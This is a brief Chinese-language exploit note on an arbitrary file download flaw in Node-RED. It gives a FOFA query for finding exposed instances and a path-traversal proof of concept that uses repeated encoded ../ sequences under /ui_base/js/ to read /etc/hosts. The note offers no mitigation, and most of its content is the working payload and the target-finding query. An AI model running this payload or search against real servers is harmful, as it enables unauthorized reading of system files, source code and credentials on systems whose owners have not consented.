# Node-RED 任意文件下载漏洞

## 漏洞描述

Node-RED存在任意文件下载漏洞，可造成信息泄露，源码泄露。

## 漏洞影响

> Node-RED

## FOFA

> title="Node-RED"

## 漏洞复现

页面如下：

![图片3](_v_images/Node-RED/图片3.png)

###poc

```
/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhosts
```

![图片4](_v_images/Node-RED/图片4.png)

![图片5](_v_images/Node-RED/图片5.png)